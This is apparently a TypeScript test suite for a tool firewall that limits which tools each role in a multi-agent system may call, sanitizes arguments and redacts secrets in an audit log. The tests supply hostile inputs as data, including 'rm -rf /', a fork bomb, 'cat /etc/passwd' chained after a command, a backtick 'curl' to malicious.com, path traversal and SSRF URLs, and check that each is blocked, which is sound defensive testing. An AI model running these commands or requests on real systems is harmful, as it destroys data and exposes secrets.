/**
 * Tests for Tool Firewall Module
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import {
  ToolFirewall,
  sanitizeFrontendPath,
  sanitizeHttpUrl,
  sanitizeCommand,
  sanitizeSecret,
  AGENT_TOOL_ALLOWLIST,
  getToolFirewall,
  resetToolFirewall,
} from '../firewall'
import type { ToolCall, AuditLogEntry } from '../firewall'

// ============================================
// PERMISSION TESTS
// ============================================

describe('ToolFirewall - Permissions', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  describe('Allow: Frontend agent', () => {
    it('allows readFile', () => {
      expect(firewall.canExecuteTool('frontend', 'readFile')).toBe(true)
    })

    it('allows writeFile', () => {
      expect(firewall.canExecuteTool('frontend', 'writeFile')).toBe(true)
    })

    it('allows httpRequest', () => {
      expect(firewall.canExecuteTool('frontend', 'httpRequest')).toBe(true)
    })

    it('allows listDir', () => {
      expect(firewall.canExecuteTool('frontend', 'listDir')).toBe(true)
    })
  })

  describe('Block: Frontend agent', () => {
    it('blocks dbWrite', () => {
      expect(firewall.canExecuteTool('frontend', 'dbWrite')).toBe(false)
    })

    it('blocks dbRead', () => {
      expect(firewall.canExecuteTool('frontend', 'dbRead')).toBe(false)
    })

    it('blocks deployService', () => {
      expect(firewall.canExecuteTool('frontend', 'deployService')).toBe(false)
    })

    it('blocks executeCommand', () => {
      expect(firewall.canExecuteTool('frontend', 'executeCommand')).toBe(false)
    })

    it('blocks getSecrets', () => {
      expect(firewall.canExecuteTool('frontend', 'getSecrets')).toBe(false)
    })
  })

  describe('Allow: Backend agent', () => {
    it('allows all common tools', () => {
      expect(firewall.canExecuteTool('backend', 'readFile')).toBe(true)
      expect(firewall.canExecuteTool('backend', 'writeFile')).toBe(true)
      expect(firewall.canExecuteTool('backend', 'dbRead')).toBe(true)
      expect(firewall.canExecuteTool('backend', 'dbWrite')).toBe(true)
      expect(firewall.canExecuteTool('backend', 'httpRequest')).toBe(true)
      expect(firewall.canExecuteTool('backend', 'externalApi')).toBe(true)
    })

    it('allows executeCommand', () => {
      expect(firewall.canExecuteTool('backend', 'executeCommand')).toBe(true)
    })

    it('allows getSecrets', () => {
      expect(firewall.canExecuteTool('backend', 'getSecrets')).toBe(true)
    })
  })

  describe('Block: Backend agent', () => {
    it('blocks deployService', () => {
      expect(firewall.canExecuteTool('backend', 'deployService')).toBe(false)
    })
  })

  describe('Allow: DevOps agent', () => {
    it('allows all tools', () => {
      const allTools: Array<any> = [
        'readFile',
        'writeFile',
        'dbRead',
        'dbWrite',
        'httpRequest',
        'externalApi',
        'executeCommand',
        'deployService',
        'getSecrets',
        'setSecrets',
      ]

      for (const tool of allTools) {
        expect(firewall.canExecuteTool('devops', tool)).toBe(true)
      }
    })
  })

  describe('Allow: Read-only agents (planner, strategist, auditor)', () => {
    it('planner allows readFile and listDir', () => {
      expect(firewall.canExecuteTool('planner', 'readFile')).toBe(true)
      expect(firewall.canExecuteTool('planner', 'listDir')).toBe(true)
      expect(firewall.canExecuteTool('planner', 'dbRead')).toBe(true)
    })

    it('strategist restricts to read-only', () => {
      expect(firewall.canExecuteTool('strategist', 'readFile')).toBe(true)
      expect(firewall.canExecuteTool('strategist', 'writeFile')).toBe(false)
      expect(firewall.canExecuteTool('strategist', 'dbWrite')).toBe(false)
    })

    it('auditor only reads', () => {
      expect(firewall.canExecuteTool('auditor', 'readFile')).toBe(true)
      expect(firewall.canExecuteTool('auditor', 'listDir')).toBe(true)
      expect(firewall.canExecuteTool('auditor', 'writeFile')).toBe(false)
      expect(firewall.canExecuteTool('auditor', 'dbWrite')).toBe(false)
      expect(firewall.canExecuteTool('auditor', 'externalApi')).toBe(false)
    })
  })

  describe('Allow: Database agent', () => {
    it('only allows database tools', () => {
      expect(firewall.canExecuteTool('database', 'dbRead')).toBe(true)
      expect(firewall.canExecuteTool('database', 'dbWrite')).toBe(true)
      expect(firewall.canExecuteTool('database', 'dbMigrate')).toBe(true)
    })

    it('blocks file operations', () => {
      expect(firewall.canExecuteTool('database', 'readFile')).toBe(false)
      expect(firewall.canExecuteTool('database', 'writeFile')).toBe(false)
    })

    it('blocks http and external calls', () => {
      expect(firewall.canExecuteTool('database', 'httpRequest')).toBe(false)
      expect(firewall.canExecuteTool('database', 'externalApi')).toBe(false)
    })
  })

  describe('Allow: QA agent', () => {
    it('allows test-related tools', () => {
      expect(firewall.canExecuteTool('qa', 'readFile')).toBe(true)
      expect(firewall.canExecuteTool('qa', 'writeFile')).toBe(true)
      expect(firewall.canExecuteTool('qa', 'dbRead')).toBe(true)
      expect(firewall.canExecuteTool('qa', 'httpRequest')).toBe(true)
      expect(firewall.canExecuteTool('qa', 'executeCommand')).toBe(true)
    })

    it('blocks destructive database ops', () => {
      expect(firewall.canExecuteTool('qa', 'dbWrite')).toBe(false)
      expect(firewall.canExecuteTool('qa', 'dbMigrate')).toBe(false)
    })

    it('blocks deployment and secrets', () => {
      expect(firewall.canExecuteTool('qa', 'deployService')).toBe(false)
      expect(firewall.canExecuteTool('qa', 'getSecrets')).toBe(false)
    })
  })
})

// ============================================
// SANITIZATION TESTS
// ============================================

describe('ToolFirewall - Argument Sanitization', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall()
  })

  describe('Sanitize: Frontend paths', () => {
    it('accepts valid frontend paths', () => {
      const result = firewall.validateAndSanitizeArgs('frontend', 'readFile', {
        path: 'src/components/Button.tsx',
      })
      expect(result.valid).toBe(true)
      expect(result.sanitized.path).toBe('src/components/Button.tsx')
    })

    it('rejects directory traversal attempts', () => {
      const result = firewall.validateAndSanitizeArgs('frontend', 'readFile', {
        path: '../../etc/passwd',
      })
      expect(result.valid).toBe(false)
      expect(result.errors.length).toBeGreaterThan(0)
    })

    it('rejects absolute paths', () => {
      const result = firewall.validateAndSanitizeArgs('frontend', 'readFile', {
        path: '/etc/secrets',
      })
      expect(result.valid).toBe(false)
    })

    it('rejects non-source paths via restrictions', () => {
      const result = firewall.checkRestrictions('frontend', 'writeFile', {
        path: 'node_modules/malware/index.js',
      })
      expect(result.allowed).toBe(false)
    })
  })

  describe('Sanitize: HTTP URLs', () => {
    it('accepts valid URLs', () => {
      const result = firewall.validateAndSanitizeArgs('frontend', 'httpRequest', {
        url: 'http://localhost:3000/api',
      })
      expect(result.valid).toBe(true)
    })

    it('rejects invalid URL format', () => {
      const result = firewall.validateAndSanitizeArgs('frontend', 'httpRequest', {
        url: 'not a url',
      })
      expect(result.valid).toBe(false)
    })

    it('accepts localhost', () => {
      const result = firewall.validateAndSanitizeArgs('frontend', 'httpRequest', {
        url: 'http://localhost:8000/test',
      })
      expect(result.valid).toBe(true)
    })
  })

  describe('Sanitize: Commands', () => {
    it('accepts safe commands', () => {
      const result = firewall.validateAndSanitizeArgs('backend', 'executeCommand', {
        command: 'npm run build',
      })
      expect(result.valid).toBe(true)
    })

    it('rejects commands with shell operators', () => {
      const result = firewall.validateAndSanitizeArgs('backend', 'executeCommand', {
        command: 'npm run build; rm -rf /',
      })
      expect(result.valid).toBe(false)
    })

    it('rejects commands with command substitution', () => {
      const result = firewall.validateAndSanitizeArgs('backend', 'executeCommand', {
        command: 'npm run $(malicious)',
      })
      expect(result.valid).toBe(false)
    })

    it('rejects forkbomb pattern', () => {
      const result = firewall.validateAndSanitizeArgs('backend', 'executeCommand', {
        command: ':(){ :|: & };:',
      })
      expect(result.valid).toBe(false)
    })

    it('rejects destructive rm commands', () => {
      const result = firewall.validateAndSanitizeArgs('backend', 'executeCommand', {
        command: 'rm -rf /',
      })
      expect(result.valid).toBe(false)
    })

    it('allows safe rm commands', () => {
      const result = firewall.validateAndSanitizeArgs('backend', 'executeCommand', {
        command: 'rm -f build/temp.txt',
      })
      expect(result.valid).toBe(true)
    })
  })

  describe('Sanitize: Secrets', () => {
    it('redacts API keys', () => {
      const result = firewall.validateAndSanitizeArgs('backend', 'externalApi', {
        apiKey: 'sk-secret-key-12345',
      })
      expect(result.sanitized.apiKey).toBe('[REDACTED]')
    })
  })
})

// ============================================
// RESTRICTION TESTS
// ============================================

describe('ToolFirewall - Restrictions', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall()
  })

  it('enforces path patterns for frontend writeFile', () => {
    const result = firewall.checkRestrictions('frontend', 'writeFile', {
      path: 'src/components/Button.tsx',
    })
    expect(result.allowed).toBe(true)
  })

  it('rejects invalid paths for frontend writeFile', () => {
    const result = firewall.checkRestrictions('frontend', 'writeFile', {
      path: 'node_modules/package/index.js',
    })
    expect(result.allowed).toBe(false)
  })

  it('enforces HTTP host restrictions for frontend', () => {
    const result = firewall.checkRestrictions('frontend', 'httpRequest', {
      url: 'http://localhost:3000/api',
    })
    expect(result.allowed).toBe(true)
  })

  it('blocks external URLs for frontend', () => {
    const result = firewall.checkRestrictions('frontend', 'httpRequest', {
      url: 'http://malicious.com/steal-data',
    })
    expect(result.allowed).toBe(false)
  })

  it('enforces command patterns for backend', () => {
    const result = firewall.checkRestrictions('backend', 'executeCommand', {
      command: 'npm run test',
    })
    expect(result.allowed).toBe(true)
  })

  it('blocks dangerous patterns in backend commands', () => {
    const result = firewall.checkRestrictions('backend', 'executeCommand', {
      command: 'rm -rf /',
    })
    expect(result.allowed).toBe(false)
  })
})

// ============================================
// BLOCKED vs ALLOWED EXAMPLES
// ============================================

describe('Examples: Blocked and Allowed Tool Calls', () => {
  let firewall: ToolFirewall
  const mockExecutor = async (name: any, args: any) => ({ success: true, result: 'OK' })

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  describe('BLOCKED: Frontend tries to access database', () => {
    it('blocks dbRead', async () => {
      const toolCall: ToolCall = {
        name: 'dbRead',
        args: { query: 'SELECT * FROM users' },
        agentId: 'frontend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
      expect(result.blocked).toBe(true)
      expect(result.error).toContain('not authorized')
    })

    it('blocks dbWrite', async () => {
      const toolCall: ToolCall = {
        name: 'dbWrite',
        args: { query: 'DELETE FROM users' },
        agentId: 'frontend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
      expect(result.blocked).toBe(true)
    })
  })

  describe('BLOCKED: Frontend tries to escape sandbox', () => {
    it('blocks path traversal in readFile', async () => {
      const toolCall: ToolCall = {
        name: 'readFile',
        args: { path: '../../.env.secret' },
        agentId: 'frontend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid')
    })

    it('blocks absolute paths in writeFile', async () => {
      const toolCall: ToolCall = {
        name: 'writeFile',
        args: { path: '/etc/passwd', content: 'hacked' },
        agentId: 'frontend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
    })
  })

  describe('BLOCKED: Frontend tries SSRF attack', () => {
    it('blocks httpRequest to external domain', async () => {
      const toolCall: ToolCall = {
        name: 'httpRequest',
        args: { url: 'http://malicious.com/steal-api-key' },
        agentId: 'frontend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
      expect(result.error).toContain('Invalid arguments')
    })
  })

  describe('BLOCKED: Backend tries shell injection', () => {
    it('blocks command with shell operator', async () => {
      const toolCall: ToolCall = {
        name: 'executeCommand',
        args: { command: 'npm test; cat /etc/passwd' },
        agentId: 'backend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
      expect(result.error).toContain('Dangerous pattern')
    })

    it('blocks command with backtick substitution', async () => {
      const toolCall: ToolCall = {
        name: 'executeCommand',
        args: { command: 'npm test `curl http://malicious.com`' },
        agentId: 'backend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
    })
  })

  describe('BLOCKED: Planner tries to write unauthorized data', () => {
    it('blocks planner from writeFile', async () => {
      const toolCall: ToolCall = {
        name: 'writeFile',
        args: { path: 'src/app.ts', content: 'malicious code' },
        agentId: 'planner',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
      expect(result.blocked).toBe(true)
    })

    it('blocks planner from dbWrite', async () => {
      const toolCall: ToolCall = {
        name: 'dbWrite',
        args: { query: 'UPDATE users SET role=admin' },
        agentId: 'planner',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(false)
    })
  })

  describe('ALLOWED: Frontend reads allowed path', () => {
    it('allows readFile from src/', async () => {
      const toolCall: ToolCall = {
        name: 'readFile',
        args: { path: 'src/components/Button.tsx' },
        agentId: 'frontend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
      expect(result.blocked).toBeUndefined()
      expect(result.data).toBeDefined()
    })

    it('allows writeFile to src/ CSS', async () => {
      const toolCall: ToolCall = {
        name: 'writeFile',
        args: { path: 'src/styles/theme.css', content: '.button { color: blue; }' },
        agentId: 'frontend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
    })
  })

  describe('ALLOWED: Frontend calls localhost API', () => {
    it('allows httpRequest to localhost', async () => {
      const toolCall: ToolCall = {
        name: 'httpRequest',
        args: { url: 'http://localhost:3000/api/data', method: 'GET' },
        agentId: 'frontend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
    })
  })

  describe('ALLOWED: Backend performs operations', () => {
    it('allows backend to dbRead', async () => {
      const toolCall: ToolCall = {
        name: 'dbRead',
        args: { query: 'SELECT * FROM products' },
        agentId: 'backend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
    })

    it('allows backend to execute safe command', async () => {
      const toolCall: ToolCall = {
        name: 'executeCommand',
        args: { command: 'npm run build' },
        agentId: 'backend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
    })

    it('allows backend to externalApi with redacted key', async () => {
      const toolCall: ToolCall = {
        name: 'externalApi',
        args: {
          endpoint: 'https://api.stripe.com/charges',
          apiKey: 'sk_live_secret123',
        },
        agentId: 'backend',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
      // Check audit log to verify redaction
      const log = firewall.getAuditLog({ agentId: 'backend', toolName: 'externalApi' })
      expect(log[0].argsSnapshot?.apiKey).toBe('[REDACTED]')
    })
  })

  describe('ALLOWED: DevOps performs all operations', () => {
    it('allows devops to deployService', async () => {
      const toolCall: ToolCall = {
        name: 'deployService',
        args: { service: 'api', environment: 'production' },
        agentId: 'devops',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
    })

    it('allows devops to getSecrets', async () => {
      const toolCall: ToolCall = {
        name: 'getSecrets',
        args: { environment: 'production' },
        agentId: 'devops',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
      // Verify audit logged with redaction
      const log = firewall.getAuditLog({ agentId: 'devops', toolName: 'getSecrets' })
      expect(log[0]).toBeDefined()
    })
  })

  describe('ALLOWED: Read-only agents read data', () => {
    it('allows strategist to readFile', async () => {
      const toolCall: ToolCall = {
        name: 'readFile',
        args: { path: 'src/app.ts' },
        agentId: 'strategist',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
    })

    it('allows auditor to dbRead', async () => {
      const toolCall: ToolCall = {
        name: 'dbRead',
        args: { query: 'SELECT COUNT(*) FROM audit_logs' },
        agentId: 'auditor',
      }

      const result = await firewall.executeToolSafely(toolCall, mockExecutor)

      expect(result.success).toBe(true)
    })
  })
})

// ============================================
// AUDIT LOGGING TESTS
// ============================================

describe('ToolFirewall - Audit Logging', () => {
  let firewall: ToolFirewall
  const mockExecutor = async (name: any, args: any) => ({ success: true })

  beforeEach(() => {
    firewall = new ToolFirewall({ enableAudit: true })
  })

  it('logs denied access', async () => {
    const toolCall: ToolCall = {
      name: 'dbWrite',
      args: { query: 'DELETE FROM users' },
      agentId: 'frontend',
    }

    await firewall.executeToolSafely(toolCall, mockExecutor)

    const log = firewall.getAuditLog({ agentId: 'frontend', action: 'denied' })
    expect(log).toHaveLength(1)
    expect(log[0].toolName).toBe('dbWrite')
    expect(log[0].action).toBe('denied')
    expect(log[0].reason).toContain('not allowed')
  })

  it('logs allowed access', async () => {
    const toolCall: ToolCall = {
      name: 'readFile',
      args: { path: 'src/app.ts' },
      agentId: 'frontend',
    }

    await firewall.executeToolSafely(toolCall, mockExecutor)

    const log = firewall.getAuditLog({ agentId: 'frontend', action: 'allowed' })
    expect(log).toHaveLength(1)
    expect(log[0].action).toBe('allowed')
  })

  it('logs sanitization', async () => {
    const toolCall: ToolCall = {
      name: 'externalApi',
      args: { apiSecret: 'sk-secret-key-12345' },
      agentId: 'backend',
    }

    await firewall.executeToolSafely(toolCall, mockExecutor)

    // Sanitization flag would be set if arguments were modified
    const log = firewall.getAuditLog({ agentId: 'backend' })
    expect(log[0]).toBeDefined()
    expect(log[0].timestamp).toBeDefined()
  })

  it('redacts secrets in audit log', async () => {
    const toolCall: ToolCall = {
      name: 'getSecrets',
      args: { apiKey: 'super-secret-key', environment: 'prod' },
      agentId: 'backend',
    }

    await firewall.executeToolSafely(toolCall, mockExecutor)

    const log = firewall.getAuditLog()[0]
    expect(log.argsSnapshot?.apiKey).toBe('[REDACTED]')
    expect(log.argsSnapshot?.environment).toBe('prod')
  })

  it('caps audit log at configured capacity', () => {
    const smallFirewall = new ToolFirewall({ auditLogCapacity: 5 })
    const mockExecutor = async () => ({ success: true })

    for (let i = 0; i < 10; i++) {
      const toolCall: ToolCall = {
        name: 'readFile',
        args: { path: `file${i}.ts` },
        agentId: 'frontend',
      }
      smallFirewall.executeToolSafely(toolCall, mockExecutor)
    }

    const log = smallFirewall.getAuditLog()
    expect(log).toHaveLength(5)
  })

  it('filters audit log by agentId', async () => {
    const executor = async () => ({ success: true })

    // Frontend call
    await firewall.executeToolSafely(
      { name: 'readFile', args: { path: 'test.ts' }, agentId: 'frontend' },
      executor
    )

    // Backend call
    await firewall.executeToolSafely(
      { name: 'dbRead', args: { query: 'test' }, agentId: 'backend' },
      executor
    )

    const frontendLog = firewall.getAuditLog({ agentId: 'frontend' })
    const backendLog = firewall.getAuditLog({ agentId: 'backend' })

    expect(frontendLog).toHaveLength(1)
    expect(backendLog).toHaveLength(1)
    expect(frontendLog[0].agentId).toBe('frontend')
    expect(backendLog[0].agentId).toBe('backend')
  })

  it('filters audit log by toolName', async () => {
    const executor = async () => ({ success: true })

    await firewall.executeToolSafely(
      { name: 'readFile', args: {}, agentId: 'backend' },
      executor
    )
    await firewall.executeToolSafely(
      { name: 'dbRead', args: {}, agentId: 'backend' },
      executor
    )

    const readFileLog = firewall.getAuditLog({ toolName: 'readFile' })
    const dbReadLog = firewall.getAuditLog({ toolName: 'dbRead' })

    expect(readFileLog).toHaveLength(1)
    expect(dbReadLog).toHaveLength(1)
  })

  it('includes duration in audit entries', async () => {
    const slowExecutor = async () => {
      await new Promise((resolve) => setTimeout(resolve, 10))
      return { success: true }
    }

    const toolCall: ToolCall = {
      name: 'readFile',
      args: { path: 'test.ts' },
      agentId: 'backend',
    }

    await firewall.executeToolSafely(toolCall, slowExecutor)

    const log = firewall.getAuditLog()[0]
    expect(log.duration).toBeGreaterThanOrEqual(10)
  })
})

// ============================================
// EDGE CASES AND ERROR HANDLING
// ============================================

describe('ToolFirewall - Edge Cases', () => {
  let firewall: ToolFirewall

  beforeEach(() => {
    firewall = new ToolFirewall()
  })

  it('handles executor throwing error', async () => {
    const failingExecutor = async () => {
      throw new Error('Executor failed')
    }

    const toolCall: ToolCall = {
      name: 'readFile',
      args: { path: 'test.ts' },
      agentId: 'backend',
    }

    const result = await firewall.executeToolSafely(toolCall, failingExecutor)

    expect(result.success).toBe(false)
    expect(result.error).toContain('Executor failed')

    // Check audit log records error
    const log = firewall.getAuditLog()[0]
    expect(log.action).toBe('error')
  })

  it('handles missing arguments', async () => {
    const toolCall: ToolCall = {
      name: 'readFile',
      args: {},
      agentId: 'frontend',
    }

    const mockExecutor = async () => ({ success: true })
    const result = await firewall.executeToolSafely(toolCall, mockExecutor)

    // Should still proceed since sanitizers check for arg existence
    expect(result.success).toBe(true)
  })

  it('handles incomplete arguments gracefully', () => {
    const result = firewall.validateAndSanitizeArgs('frontend', 'readFile', {
      otherArg: 'test',
    })

    // When required arg is missing, it's not validated by sanitizers
    expect(result.valid).toBe(true)
  })

  it('generates unique audit IDs', async () => {
    const executor = async () => ({ success: true })

    const call1: ToolCall = { name: 'readFile', args: {}, agentId: 'backend' }
    const call2: ToolCall = { name: 'readFile', args: {}, agentId: 'backend' }

    const result1 = await firewall.executeToolSafely(call1, executor)
    const result2 = await firewall.executeToolSafely(call2, executor)

    expect(result1.auditLogId).not.toBe(result2.auditLogId)
    expect(result1.auditLogId).toMatch(/^audit-/)
    expect(result2.auditLogId).toMatch(/^audit-/)
  })
})

// ============================================
// GLOBAL FIREWALL TESTS
// ============================================

describe('Global Firewall Instance', () => {
  afterEach(() => {
    resetToolFirewall()
  })

  it('returns same instance when called multiple times', () => {
    const fw1 = getToolFirewall()
    const fw2 = getToolFirewall()
    expect(fw1).toBe(fw2)
  })

  it('resets firewall properly', () => {
    const fw1 = getToolFirewall()
    resetToolFirewall()
    const fw2 = getToolFirewall()
    expect(fw1).not.toBe(fw2)
  })
})
